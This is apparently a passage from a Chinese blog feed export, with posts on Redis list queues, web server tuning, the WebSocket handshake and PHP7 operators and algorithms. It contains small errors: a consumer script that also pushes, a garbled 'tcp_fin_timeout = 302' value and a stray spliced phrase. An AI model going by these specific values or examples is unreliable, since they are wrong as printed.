<figure class="highlight node-repl"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">lpush queue a</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">lpush queue b</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">lpush queue c</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">lpush queue d</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">lpush queue e</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">lpush queue f</span></span><br></pre></td></tr></table></figure>

<p>查看队列中的所有数据</p>
<figure class="highlight tcl"><table><tr><td class="code"><pre><span class="line">&gt; <span class="keyword">lrange</span> queue <span class="number">0</span> <span class="number">-1</span></span><br><span class="line"><span class="number">1</span>) <span class="string">&quot;f&quot;</span></span><br><span class="line"><span class="number">2</span>) <span class="string">&quot;e&quot;</span></span><br><span class="line"><span class="number">3</span>) <span class="string">&quot;d&quot;</span></span><br><span class="line"><span class="number">4</span>) <span class="string">&quot;c&quot;</span></span><br><span class="line"><span class="number">5</span>) <span class="string">&quot;b&quot;</span></span><br><span class="line"><span class="number">6</span>) <span class="string">&quot;a&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="2-出队-非阻塞模式"><a href="#2-出队-非阻塞模式" class="headerlink" title="2) 出队 (非阻塞模式)"></a>2) 出队 (非阻塞模式)</h2><p>lpop 弹出并返回列表首元素（即最后入队的元素）</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">&gt; lpop queue</span><br><span class="line"><span class="string">&quot;f&quot;</span></span><br></pre></td></tr></table></figure>

<p>rpop 弹出并返回列表尾元素 （即入队的最开始的一个元素）</p>
<p>注意：如果要当作队列功能，应该是用这个出队</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">&gt; rpop queue</span><br><span class="line"><span class="string">&quot;a&quot;</span></span><br></pre></td></tr></table></figure>

<p>这里的出队都是非阻塞模式，就是你用 pop 出队的时候，如果队列是空的话，你得到的是一个 NULL 的值</p>
<h2 id="3-出队-阻塞模式"><a href="#3-出队-阻塞模式" class="headerlink" title="3) 出队 (阻塞模式)"></a>3) 出队 (阻塞模式)</h2><p>假如现在 queue 队列为空  我们用 brpop 命令</p>
<p>BRPOP 是一个阻塞的列表弹出原语。 它是 RPOP 的阻塞版本，因为这个命令会在给定 list 无法弹出任何元素的时候阻塞连接。 该命令会按照给出的 key 顺序查看 list，并在找到的第一个非空 list 的尾部弹出一个元素。</p>
<p>A) 我们执行 brpop 命令</p>
<p>可以看到队列 queue 没有元素的时候  是阻塞的  即不返回值    </p>
<p>其中 0 是超时时间 为 0 表示一直等待</p>
<figure class="highlight node-repl"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">brpop queue <span class="number">0</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>B) 这个时候我们用 lpush 往队列里 入队一个数据 “bbb”</p>
<figure class="highlight lasso"><table><tr><td class="code"><pre><span class="line">&gt; lpush <span class="built_in">queue</span> bbb</span><br><span class="line">(<span class="built_in">integer</span>) <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>C) 阻塞的队列立马会弹出出队元素   显示队列名字 和 出队元素 已经等待了多少时间</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">&gt; brpop queue <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span>) <span class="string">&quot;queue&quot;</span></span><br><span class="line"><span class="number">2</span>) <span class="string">&quot;bbb&quot;</span></span><br><span class="line">(<span class="number">271.24</span>s)</span><br></pre></td></tr></table></figure>

<p>D) Brpop 还能同时阻塞多个队列比如这样</p>
<figure class="highlight node-repl"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">brpop queue queue1 queue2 <span class="number">0</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="用-redis-的-list-当作队列可能存在的问题"><a href="#用-redis-的-list-当作队列可能存在的问题" class="headerlink" title="用 redis 的 list 当作队列可能存在的问题"></a>用 redis 的 list 当作队列可能存在的问题</h2><ol>
<li><p>redis 崩溃的时候队列功能失效</p>
</li>
<li><p>如果入队端一直在塞数据，而出队端没有消费数据，或者是入队的频率大而多，出队端的消费频率慢会导致内存暴涨</p>
</li>
<li><p>Redis 的队列也可以像 rabbitmq 那样  即可以做消息的持久化，也可以不做消息的持久化。</p>
</li>
</ol>
<p>当做持久话的时候，需要启动 redis 的 dump 数据的功能。暂时不建议开启持久化。</p>
<p>Redis 其实只适合作为缓存，而不是数据库或是存储。它的持久化方式适用于救救急啥的，不太适合当作一个普通功能来用。应为 dump 时候，会影响性能，数据量小的时候还看不出来，当数据量达到百万级别，内存 10g 左右的时候，非常影响性能。</p>
<ol start="4">
<li><p>假如有多个消费者同时监听一个队列，其中一个出队了一个元素，另一个则获取不到该元素</p>
</li>
<li><p>Redis 的队列应用场景是一对多或者一对一的关系，即有多个入队端，但是只有一个消费端 (出队)</p>
</li>
</ol>
<h2 id="PHP-的-redis-简单操作示例"><a href="#PHP-的-redis-简单操作示例" class="headerlink" title="PHP 的 redis 简单操作示例"></a>PHP 的 redis 简单操作示例</h2><p>入队列操作稳健 <code>list_push.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$redis</span> = <span class="keyword">new</span> <span class="title class_">Redis</span>();</span><br><span class="line"><span class="variable">$redis</span>-&gt;<span class="title function_ invoke__">connect</span>(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">6379</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="variable">$redis</span>-&gt;<span class="title function_ invoke__">lPush</span>(<span class="string">&#x27;list1&#x27;</span>, <span class="string">&#x27;A_&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>));</span><br><span class="line">    <span class="title function_ invoke__">sleep</span>(<span class="title function_ invoke__">rand</span>()%<span class="number">3</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行 <code>$ php list_push.php &amp;</code></p>
<p>出队列操作 <code>list_pop.php</code> 文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$redis</span> = <span class="keyword">new</span> <span class="title class_">Redis</span>();</span><br><span class="line"><span class="variable">$redis</span>-&gt;<span class="title function_ invoke__">connect</span>(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">6379</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">var_export</span>(<span class="variable">$redis</span>-&gt;<span class="title function_ invoke__">blPop</span>(<span class="string">&#x27;list1&#x27;</span>, <span class="number">10</span>));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="comment">// echo $e;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$redis</span>-&gt;<span class="title function_ invoke__">lPush</span>(<span class="string">&#x27;list1&#x27;</span>, <span class="string">&#x27;A_&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>));</span><br><span class="line">    <span class="title function_ invoke__">sleep</span>(<span class="title function_ invoke__">rand</span>()%<span class="number">3</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Redis</category>
      </categories>
  </entry>
  <entry>
    <title>网站架构部署</title>
    <url>/2018/03/website-deploy/</url>
    <content><![CDATA[<h2 id="网站架构"><a href="#网站架构" class="headerlink" title="网站架构"></a>网站架构</h2><ol>
<li>使用 HTTPS 加密证书保证网站传输数据安全</li>
<li>LNMP 架构参数，根据网站用户和流量，并发调优，如以下文件</li>
</ol>
<span id="more"></span>

<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">/etc/sysctl<span class="selector-class">.conf</span></span><br><span class="line">nginx<span class="selector-class">.conf</span></span><br><span class="line">my<span class="selector-class">.cnf</span></span><br><span class="line">php.ini</span><br></pre></td></tr></table></figure>

<ol>
<li><p>缓存，主从复制，就是读写分离，可申请专用的服务器作为缓存服务器</p>
</li>
<li><p>MYSQL 主从复制，就是读写分离，后台可以用作数据库服务器</p>
</li>
<li><p>网站所有图片放在 NFS 网络文件共享服务器上面</p>
</li>
<li><p>使用企业级监控告警 Nagios，监控 Linux，监控 Nginx，监控 Mysql 解析错误日志</p>
</li>
<li><p>增加备份服务器，使用 rsync 实时备份 NSF 中的文件， 定期备份数据库文件到备份服务器。</p>
</li>
<li><p>【推荐】高并发服务器建议调小 TCP 协议的 time_wait 超时时间。</p>
<p> 说明：操作系统默认 240 秒后，才会关闭处于 time_wait 状态的连接，在高并发访问下，服务器端会因为处于 time_wait 的连接数太多，可能无法建立新的连接，所以需要在服务器上调小此等待值。<br> 正例：在 linux 服务器上请通过变更 &#x2F;etc&#x2F;sysctl.conf 文件去修改该缺省值（秒）：net.ipv4.tcp_fin_timeout &#x3D; 302。</p>
</li>
<li><p>【推荐】调大服务器所支持的最大文件句柄数（File Descriptor，简写为 fd）。说明：主流操作系统的设计是将 TCP&#x2F;UDP 连接采用与文件一样的方式去管理，即一个连接对应于一个 fd。</p>
<p> 主流的 linux 服务器默认所支持最大 fd 数量为 1024，当并发连接数很大时很容易阿里巴巴 JAVA 开发手册因为 fd 不足而出现 “open too many files” 错误，导致新的连接无法建立。<br> 建议将 linux 服务器所支持的最大句柄数调高数倍（与服务器的内存数量相关）</p>
</li>
</ol>
<p><img src="/images/2018/092626_fi9c_2829137.jpeg"></p>
]]></content>
      <categories>
        <category>Website</category>
      </categories>
  </entry>
  <entry>
    <title>我见过的最好的 WebSocket 介绍</title>
    <url>/2018/03/websocket-description/</url>
    <content><![CDATA[<h2 id="一、WebSocket是HTML5出的东西（协议）"><a href="#一、WebSocket是HTML5出的东西（协议）" class="headerlink" title="一、WebSocket是HTML5出的东西（协议）"></a>一、WebSocket是HTML5出的东西（协议）</h2><p>也就是说HTTP协议没有变化，或者说没关系，但HTTP是不支持持久连接的（长连接，循环连接的不算）</p>
<p>首先HTTP有1.1和1.0之说，也就是所谓的keep-alive，把多个HTTP请求合并为一个，但是Websocket其实是一个新协议，跟HTTP协议基本没有关系。</p>
<span id="more"></span>

<p>只是为了兼容现有浏览器的握手规范而已，也就是说它是HTTP。有交集，但是并不是全部。   </p>
<p>另外Html5是指的一系列新的API，或者说新规范，新技术。Http协议本身只有1.0和1.1，而且跟Html本身没有直接关系。。   </p>
<p>通俗来说，你可以用HTTP<strong>协议</strong>传输非Html<strong>数据</strong>。</p>
<p>再简单来说，<strong>层级不一样</strong>。</p>
<h2 id="二、Websocket是什么样的协议，具体有什么优点"><a href="#二、Websocket是什么样的协议，具体有什么优点" class="headerlink" title="二、Websocket是什么样的协议，具体有什么优点"></a>二、Websocket是什么样的协议，具体有什么优点</h2><p>首先，Websocket是一个持久化的协议，相对于HTTP这种非持久的协议来说。</p>
<p>简单的举个例子吧，用目前应用比较广泛的PHP生命周期来解释。   </p>
<ol>
<li>HTTP的生命周期通过Request来界定，也就是一个Request 一个Response，那么在HTTP1.0中，这次HTTP请求就结束了。</li>
</ol>
<p>在HTTP1.1中进行了改进，使得有一个keep-alive，也就是说，在一个HTTP连接中，可以发送多个Request，接收多个Response。   </p>
<p>但是请记住 Request &#x3D; Response ， 在HTTP中永远是这样，也就是说一个request只能有一个response。而且这个response也是被动的，不能主动发起。   </p>
<h4 id="跟Websocket有什么关系呢？"><a href="#跟Websocket有什么关系呢？" class="headerlink" title="跟Websocket有什么关系呢？"></a>跟Websocket有什么关系呢？</h4><p>首先Websocket是基于HTTP协议的，或者说借用了HTTP的协议来完成一部分握手。</p>
<p>在握手阶段是一样的，以下涉及专业技术内容，首先我们来看个典型的Websocket握手（借用Wikipedia）</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/chat</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>server.example.com</span><br><span class="line"><span class="attribute">Upgrade</span><span class="punctuation">: </span>websocket</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Upgrade</span><br><span class="line"><span class="attribute">Sec-WebSocket-Key</span><span class="punctuation">: </span>x3JJHMbDL1EzLkh9GBhXDw==</span><br><span class="line"><span class="attribute">Sec-WebSocket-Protocol</span><span class="punctuation">: </span>chat, superchat</span><br><span class="line"><span class="attribute">Sec-WebSocket-Version</span><span class="punctuation">: </span>13</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://example.com</span><br></pre></td></tr></table></figure>

<p>熟悉HTTP的童鞋可能发现了，这段类似HTTP协议的握手请求中，多了几个东西。</p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Upgrade:</span> websocket</span><br><span class="line"><span class="symbol">Connection:</span> Upgrade</span><br></pre></td></tr></table></figure>

<p>这个就是Websocket的核心了，告诉Apache、Nginx等服务器，发起的是Websocket协议。</p>
<p>首先，Sec-WebSocket-Key 是一个Base64 encode的值，这个是浏览器随机生成的，告诉服务器验证是不是真的是Websocket协议。</p>
<p>然后，Sec_WebSocket-Protocol 是一个用户定义的字符串，用来区分同URL下，不同的服务所需要的协议。</p>
<p>最后，Sec-WebSocket-Version 是告诉服务器所使用的Websocket Draft（协议版本），在最初的时候，Websocket协议还在 Draft 阶段，各种奇奇怪怪的协议都有。</p>
<p>而且还有很多期奇奇怪怪不同的东西，什么Firefox和Chrome用的不是一个版本之类的，当初Websocket协议太多可是一个大难题。不过现在还好，已经定下来啦。</p>
<p>然后服务器会返回下列东西，表示已经接受到请求， 成功建立Websocket。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">101</span> Switching Protocols</span><br><span class="line"><span class="attribute">Upgrade</span><span class="punctuation">: </span>websocket</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Upgrade</span><br><span class="line"><span class="attribute">Sec-WebSocket-Accept</span><span class="punctuation">: </span>HSmrc0sMlYUkAGmm5OPpG2HaGWk=</span><br><span class="line"><span class="attribute">Sec-WebSocket-Protocol</span><span class="punctuation">: </span>chat</span><br></pre></td></tr></table></figure>

<p>这里开始就是HTTP最后负责的区域了，告诉客户，我已经成功切换协议。</p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Upgrade:</span> websocket</span><br><span class="line"><span class="symbol">Connection:</span> Upgrade</span><br></pre></td></tr></table></figure>

<p>依然是固定的，告诉客户端即将升级的是Websocket协议，而不是mozillasocket，lurnarsocket或者shitsocket。</p>
<p>然后，Sec-WebSocket-Accept 这个则是经过服务器确认，并且加密过后的 Sec-WebSocket-Key。</p>
<p>后面的，Sec-WebSocket-Protocol 则是表示最终使用的协议。</p>
<p>至此，HTTP已经完成它所有工作了，接下来就是完全按照Websocket协议进行了。</p>
<hr>
<h2 id="三、Websocket的作用"><a href="#三、Websocket的作用" class="headerlink" title="三、Websocket的作用"></a>三、Websocket的作用</h2><p>在讲Websocket之前，我就顺带着讲下 long poll 和 ajax 轮询的原理。</p>
<h4 id="ajax轮询"><a href="#ajax轮询" class="headerlink" title="ajax轮询"></a>ajax轮询</h4><p>首先是 ajax轮询 ，ajax轮询 的原理非常简单，让浏览器隔个几秒就发送一次请求，询问服务器是否有新信息。</p>
<p>场景再现：</p>
<figure class="highlight vbscript"><table><tr><td class="code"><pre><span class="line">客户端：啦啦啦，有没有新信息(<span class="built_in">Request</span>)   </span><br><span class="line">服务端：没有（<span class="built_in">Response</span>）   </span><br><span class="line">客户端：啦啦啦，有没有新信息(<span class="built_in">Request</span>)   </span><br><span class="line">服务端：没有。。（<span class="built_in">Response</span>）   </span><br><span class="line">客户端：啦啦啦，有没有新信息(<span class="built_in">Request</span>)   </span><br><span class="line">服务端：你好烦啊，没有啊。。（<span class="built_in">Response</span>）   </span><br><span class="line">客户端：啦啦啦，有没有新消息（<span class="built_in">Request</span>）   </span><br><span class="line">服务端：好啦好啦，有啦给你。（<span class="built_in">Response</span>）   </span><br><span class="line">客户端：啦啦啦，有没有新消息（<span class="built_in">Request</span>）   </span><br><span class="line">服务端：。。。。。没。。。。没。。。没有（<span class="built_in">Response</span>） —- <span class="keyword">loop</span></span><br></pre></td></tr></table></figure>

<h4 id="long-poll"><a href="#long-poll" class="headerlink" title="long poll"></a>long poll</h4><p>long poll 其实原理跟 ajax轮询 差不多，都是采用轮询的方式，不过采取的是阻塞模型（一直打电话，没收到就不挂电话），也就是说，客户端发起连接后，如果没消息，就一直不返回Response给客户端。</p>
<p>直到有消息才返回，返回完之后，客户端再次建立连接，周而复始。</p>
<p>场景再现:</p>
<figure class="highlight vbscript"><table><tr><td class="code"><pre><span class="line">客户端：啦啦啦，有没有新信息，没有的话就等有了才返回给我吧（<span class="built_in">Request</span>）   </span><br><span class="line">服务端：额。。 等待到有消息的时候。。来 给你（<span class="built_in">Response</span>）   </span><br><span class="line">客户端：啦啦啦，有没有新信息，没有的话就等有了才返回给我吧（<span class="built_in">Request</span>） -<span class="keyword">loop</span></span><br></pre></td></tr></table></figure>

<p>从上面可以看出其实这两种方式，都是在不断地建立HTTP连接，然后等待服务端处理，可以体现HTTP协议的另外一个特点，被动性。</p>
<p>何为被动性呢，其实就是，服务端不能主动联系客户端，只能有客户端发起。</p>
<p>简单地说就是，服务器是一个很懒的冰箱（这是个梗）（不会、不能主动发起连接），但是上司有命令，如果有客户来，不管多么累都要好好接待。</p>
<p>说完这个，我们再来说一说上面的缺陷（原谅我废话这么多吧OAQ）从上面很容易看出来，不管怎么样，上面这两种都是非常消耗资源的。   </p>
<p>ajax轮询 需要服务器有很快的处理速度和资源。（速度）long poll 需要有很高的并发，也就是说同时接待客户的能力。   </p>
<p>（场地大小）所以ajax轮询 和long poll 都有可能发生这种情况。</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="strong">**客户端：啦啦啦啦，有新信息么？**</span>   </span><br><span class="line"><span class="strong">**服务端：月线正忙，请稍后再试（503 Server Unavailable）**</span>   </span><br><span class="line"><span class="strong">**客户端：。。。。好吧，啦啦啦，有新信息么？**</span>   </span><br><span class="line"><span class="strong">**服务端：月线正忙，请稍后再试（503 Server Unavailable）**</span>   </span><br><span class="line"><span class="strong">**客户端：**</span></span><br></pre></td></tr></table></figure>

<h4 id="长连接-Websocket-的场景"><a href="#长连接-Websocket-的场景" class="headerlink" title="长连接 Websocket 的场景"></a>长连接 Websocket 的场景</h4><p>通过上面这个例子，我们可以看出，这两种方式都不是最好的方式，需要很多资源。   </p>
<p>一种需要更快的速度，一种需要更多的’电话’。这两种都会导致’电话’的需求越来越高。   </p>
<p>HTTP还是一个无状态协议。</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">通俗的说就是，服务器因为每天要接待太多客户了，是个<span class="strong">**健忘鬼**</span>，你一挂电话，他就把你的东西全忘光了，把你的东西全丢掉了。</span><br><span class="line"></span><br><span class="line">你第二次还得再告诉服务器一遍。</span><br></pre></td></tr></table></figure>

<p>所以在这种情况下出现了，Websocket出现了。他解决了HTTP的这几个难题。   </p>
<p>首先，<strong>被动性</strong>，当服务器完成协议升级后（HTTP-&gt;Websocket），服务端就可以主动推送信息给客户端啦。</p>
<p>所以上面的情景可以做如下修改。</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">客户端：啦啦啦，我要建立Websocket协议，需要的服务：chat，Websocket协议版本：<span class="number">17</span>（HTTP Request）   </span><br><span class="line">服务端：ok，确认，已升级为Websocket协议（HTTP Protocols <span class="keyword">Switched） </span>  </span><br><span class="line">客户端：麻烦你有信息的时候推送给我噢。。   </span><br><span class="line">服务端：ok，有的时候会告诉你的。   </span><br><span class="line">服务端：<span class="keyword">balabalabalabala </span>  </span><br><span class="line">服务端：<span class="keyword">balabalabalabala </span>  </span><br><span class="line">服务端：哈哈哈哈哈啊哈哈哈哈   </span><br><span class="line">服务端：笑死我了哈哈哈哈哈哈哈</span><br></pre></td></tr></table></figure>

<p>就变成了这样，<strong>只需要经过一次HTTP请求</strong>，就可以做到源源不断的信息传送了。</p>
<p>（在程序设计中，这种设计叫做回调，即：你有信息了再来通知我，而不是我傻乎乎的每次跑来问你）这样的协议解决了上面同步有延迟，而且还非常消耗资源的这种情况。</p>
<h4 id="那么为什么他会解决服务器上消耗资源的问题呢？"><a href="#那么为什么他会解决服务器上消耗资源的问题呢？" class="headerlink" title="那么为什么他会解决服务器上消耗资源的问题呢？"></a>那么为什么他会解决服务器上消耗资源的问题呢？</h4><p>其实我们所用的程序是要经过两层代理的，<strong>即HTTP协议在Nginx等服务器的解析下</strong>，然后再传送给相应的<strong>Handler（PHP等）</strong>来处理。</p>
<p>简单地说，我们有一个非常快速的<strong>接线员（Nginx）</strong>，他负责把问题转交给相应的<strong>客服（Handler）。</strong></p>
<p>本身<strong>接线员基本上速度是足够的</strong>，但是每次都卡在<strong>客服（Handler）</strong>了，老有客服处理速度太慢。，导致客服不够。</p>
<p>Websocket就解决了这样一个难题，建立后，可以直接跟接线员建立持<strong>久连接</strong>，有信息的时候客服想办法通知接线员，然后<strong>接线员在统一转交给客户</strong>。</p>
<p>这样就可以解决客服处理速度过慢的问题了。</p>
<p>同时，在传统的方式上，要不断的建立，关闭HTTP协议，由于HTTP是非状态性的，<strong>每次都要重新传输identity info（鉴别信息）</strong>，来告诉服务端你是谁。</p>
<p>虽然接线员很快速，但是每次都要听这么一堆，效率也会有所下降的，同时还得不断把这些信息转交给客服，不但浪费客服的<strong>处理时间</strong>，而且还会在网路传<strong>输中消耗过多的流量&#x2F;时间。</strong></p>
<p>但是Websocket<strong>只需要一次HTTP握手，所以说整个通讯过程是建立在一次连接&#x2F;状态中</strong>，也就避免了HTTP的非状态性，服务端会一直知道你的信息，直到你关闭请求，这样就解决了接线员要反复解析HTTP协议，还要查看identity info的信息。</p>
<p>同时由<strong>客户主动询问</strong>，转换为<strong>服务器（推送）有信息的时候就发送（当然客户端还是等主动发送信息过来的。。）</strong>，没有信息的时候就交给接线员（Nginx），不需要占用本身速度就慢的<strong>客服（Handler）</strong>了</p>
<p>至于怎么在不支持Websocket的客户端上使用Websocket。。<strong>答案是：不能</strong></p>
<p>但是可以通过上面说的 long poll 和 ajax 轮询来 <strong>模拟出类似的效果</strong></p>
]]></content>
      <categories>
        <category>Network</category>
      </categories>
      <tags>
        <tag>WebSocket</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP7 新增运算符</title>
    <url>/2018/05/php-operator/</url>
    <content><![CDATA[<h2 id="PHP7-新增-Operator"><a href="#PHP7-新增-Operator" class="headerlink" title="PHP7 新增 Operator"></a>PHP7 新增 Operator</h2><blockquote>
<p>NULL 合并运算符 <br>其实是三元运算符的改造，减少的代码量</p>
</blockquote>
<span id="more"></span>

<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//</span>原先的做法</span><br><span class="line"><span class="regexp">//</span><span class="variable">$lig</span> = isset(<span class="variable">$_GET</span>[<span class="string">&#x27;lig&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;lig&#x27;</span>]:<span class="string">&#x27;bee&#x27;</span>;</span><br><span class="line"><span class="variable">$lig</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;lig&#x27;</span>]??<span class="string">&#x27;bee&#x27;</span>;</span><br><span class="line">echo <span class="variable">$lig</span>;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>太空船运算符（组合比较符） <br>实质就是大小比较符，不过相比’&lt;’、’&gt;’的返回值多了-1，跟java的字符串比较compareto()功能类似</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">1</span>&lt;=&gt;<span class="number">1.1</span>;</span><br><span class="line"><span class="keyword">print</span> (PHP_EOL);<span class="comment">//换行符</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">print</span> (<span class="number">1.1</span>&lt;=&gt;<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="number">1</span>&lt;=&gt;<span class="string">&#x27;1&#x27;</span>;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Php</category>
      </categories>
  </entry>
  <entry>
    <title>Php Interview 总结</title>
    <url>/2018/05/php-interview/</url>
    <content><![CDATA[<h2 id="算法"><a href="#算法" class="headerlink" title="算法#"></a>算法<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIyVFNyVBRSU5NyVFNiVCMyU5NQ==">#<i class="fa fa-external-link-alt"></i></span></h2><h3 id="1-反转函数的实现"><a href="#1-反转函数的实现" class="headerlink" title="1.反转函数的实现#"></a>1.反转函数的实现<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzElRTUlOEYlOEQlRTglQkQlQUMlRTUlODclQkQlRTYlOTUlQjAlRTclOUElODQlRTUlQUUlOUUlRTclOEUlQjA=">#<i class="fa fa-external-link-alt"></i></span></h3><span id="more"></span>

<figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 反转数组</span><br><span class="line"> * @param  <span class="keyword">array</span> <span class="variable">$arr</span> </span><br><span class="line"> * @<span class="keyword">return</span> <span class="keyword">array</span></span><br><span class="line"> */</span><br><span class="line"><span class="keyword">function</span><span class="built_in"> reverse</span>(<span class="variable">$arr</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$n</span> =<span class="built_in"> count</span>(<span class="variable">$arr</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$left</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$right</span> = <span class="variable">$n</span> - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    while (<span class="variable">$left</span> &lt; <span class="variable">$right</span>) &#123;</span><br><span class="line">        <span class="variable">$temp</span> = <span class="variable">$arr</span>[<span class="variable">$left</span>];</span><br><span class="line">        <span class="variable">$arr</span>[<span class="variable">$left</span>++] = <span class="variable">$arr</span>[<span class="variable">$right</span>];</span><br><span class="line">        <span class="variable">$arr</span>[<span class="variable">$right--</span>] = <span class="variable">$temp</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$arr</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-两个有序int集合是否有相同元素的最优算法"><a href="#2-两个有序int集合是否有相同元素的最优算法" class="headerlink" title="2.两个有序int集合是否有相同元素的最优算法#"></a>2.两个有序int集合是否有相同元素的最优算法<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzIlRTQlQjglQTQlRTQlQjglQUElRTYlOUMlODklRTUlQkElOEZpbnQlRTklOUIlODYlRTUlOTAlODglRTYlOTglQUYlRTUlOTAlQTYlRTYlOUMlODklRTclOUIlQjglRTUlOTAlOEMlRTUlODUlODMlRTclQjQlQTAlRTclOUElODQlRTYlOUMlODAlRTQlQkMlOTglRTclQUUlOTclRTYlQjMlOTU=">#<i class="fa fa-external-link-alt"></i></span></h3><figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 寻找两个有序数组里相同的元素</span><br><span class="line"> * @param  <span class="keyword">array</span> <span class="variable">$arr1</span> </span><br><span class="line"> * @param  <span class="keyword">array</span> <span class="variable">$arr2</span> </span><br><span class="line"> * @<span class="keyword">return</span> <span class="keyword">array</span>      </span><br><span class="line"> */</span><br><span class="line"><span class="keyword">function</span> find_common(<span class="variable">$arr1</span>, <span class="variable">$arr2</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$common</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="variable">$i</span> = <span class="variable">$j</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$count1</span> =<span class="built_in"> count</span>(<span class="variable">$arr1</span>);</span><br><span class="line">    <span class="variable">$count2</span> =<span class="built_in"> count</span>(<span class="variable">$arr2</span>);</span><br><span class="line">    while (<span class="variable">$i</span> &lt; <span class="variable">$count1</span> &amp;&amp; <span class="variable">$j</span> &lt; <span class="variable">$count2</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$arr1</span>[<span class="variable">$i</span>] &lt; <span class="variable">$arr2</span>[<span class="variable">$j</span>]) &#123;</span><br><span class="line">            <span class="variable">$i</span>++;</span><br><span class="line">        &#125; elseif (<span class="variable">$arr1</span>[<span class="variable">$i</span>] &gt; <span class="variable">$arr2</span>[<span class="variable">$j</span>]) &#123;</span><br><span class="line">            <span class="variable">$j</span>++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$common</span>[] = <span 